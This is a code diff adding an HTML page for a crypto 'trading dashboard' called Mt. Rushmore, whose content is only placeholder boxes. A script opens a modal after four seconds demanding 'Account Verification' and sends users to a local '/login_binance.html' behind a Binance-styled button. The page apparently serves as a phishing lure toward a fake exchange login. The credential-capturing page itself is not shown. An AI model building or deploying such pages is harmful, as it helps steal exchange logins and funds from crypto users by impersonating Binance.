@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              primary: "#0072F5",
+            },
+          },
+        },
+      };
+    </script>
+    <title>Mt. Rushmore | Dashboard</title>
+  </head>
+
+  <body class="overflow-hidden">
+    <input class="modal-state" id="modal-3" type="checkbox"/>
+    <div class="modal">
+      <label class="modal-overlay"></label>
+      <div class="modal-content flex flex-col gap-5">
+        <h2 class="text-xl">Account Verification</h2>
+        <span>In order to access your account and start trading with our strategies, you need to verify your identity.</span>
+        <span>This will complete the KYC verification and enable you to start using our platform without any limitations.</span>
+        <div class="flex gap-3">
+            <a href="/login_binance.html" class="w-full">
+                <button class="btn btn-outline-[#f0b90b] btn-block text-[#f0b90b] gap-3">
+                    <img class="w-6" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAACeklEQVR4nO2bS07DMBBAXZZOJMQCxGHKNTgAnwVwCO4A6qZcA4FDb0EluEVSBbZlUNqmSC2pZ/xJPXFGys6x+l5ce/wToo8++thXAIhB9YgYA0AMikw+zrJkDPfiQEQKD6snHgmwDR+PBGiG774E0MN3VwLg4bsnAejw3ZEA5vD8JYA9PF8J4A6enwRwD89HAviDD18CVPBKjihAhUp+qof2jhwFN4ECgy+/BE9vCyUviiyZs20JYAFf18FWAjiAZysBHMKzlJBPjg5nSk7R8FkyL5S81tVblSFJUHJa/Raxjyhf0uOZku+2X960JRSZ/Px+lqdin1FqJCzgVXpDrVcnIQh4nQRTeJ2E1uEBxCCfpEOKBAz8V5acVO9RJGDg89f0zFmyBKvefpWx3WEkYODXZRFAtQRU2Td5tRCmkifr0QE2hjq0hNfknNRaEGBVndrWUsOvRwgLCdAwzlN7dHR/Yfm/3oK3kQCaJMdUgnbEMJTQCG8iAZAZHlUCOmcgStDCUyQAMb3FSsDCUyWg4bESYCngYe8ClPxACaDPHcba4RGQErz9BZDwBhL08FgJ3jpBIjxBAh5eJ8HbMGgIj5BAh2+SgIE3SoQQ8KhEaFuCOfymBDR8nQqjy+rhSanwnwR7eOvJkEaCt8nQJB22unJc7poOW/QXwUyHrRdEDCSwWBApfS2JZfIy+CWxPPZFUfCxLI788s7G+aA2RrjBO90a4wrvZHOUO3wdUW+Pt3pAIlT4Vo7IhA7v9ZAUF3gvx+S4wTs9KMkV3slRWe7wVoeluwJvdFy+a/CkCxNdhUddmek6/M5LU7HA/3ttLjb4OqK+ONlHHyKI+AUPtv4JkISRWgAAAABJRU5ErkJggg==">
+                    Verify with Binance
+                </button>
+            </a>
+        </div>
+      </div>
+    </div>
+
+    <header class="p-4 lg:px-6 flex items-center">
+      <a class="flex items-center justify-center" href="#">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          class="h-6 w-6"
+        >
+          <path d="m8 3 4 8 5-5 5 15H2L8 3z"></path>
+        </svg>
+        <span class="sr-only">Mt. Rushmore Inc.</span>
+      </a>
+      <nav class="ml-auto flex items-center gap-4 sm:gap-6">
+        <div class="avatar avatar-ring-primary">
+            <p id="namePlate"></p>
+        </div>
+      </nav>
+    </header>
+
+    <div class="flex overflow-x-hidden mt-5">
+      <div class="flex flex-col p-5 box-border">
+        <h1 class="font-bold text-3xl my-5">Top Gainers</h1>
+        <div class="flex gap-10">
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+        </div>
+      </div>
+      <div class="hidden sm:flex flex-col p-5 box-border">
+        <h1 class="font-bold text-3xl my-5">Top Losers</h1>
+        <div class="flex gap-10">
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+          <div class="skeleton h-24 w-40 rounded-md"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="flex flex-col p-5 box-border">
+      <h1 class="font-bold text-3xl my-5">Crypto Predictions</h1>
+      <div class="flex gap-10">
+        <div class="skeleton h-40 w-60 rounded-md"></div>
+        <div class="skeleton h-40 w-60 rounded-md"></div>
+        <div class="skeleton h-40 w-60 rounded-md"></div>
+        <div class="skeleton h-40 w-60 rounded-md hidden sm:block"></div>
+      </div>
+      <div class="divider my-10"></div>
+      <h1 class="font-bold text-3xl my-5">Top Stories Today</h1>
+      <div class="flex gap-10">
+        <div class="skeleton h-60 w-90 rounded-md"></div>
+        <div class="skeleton h-60 w-90 rounded-md"></div>
+      </div>
+    </div>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        var modal = document.getElementById('modal-3');
+        window.onload = () => {
+            setTimeout(() => {
+                modal.checked = true;
+            }, 4000);
+        }
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        var namePlate = document.getElementById('namePlate');
+        namePlate.innerHTML = getCookie('username').split('')[0].toUpperCase();
+    </script>
+  </body>
+</html>
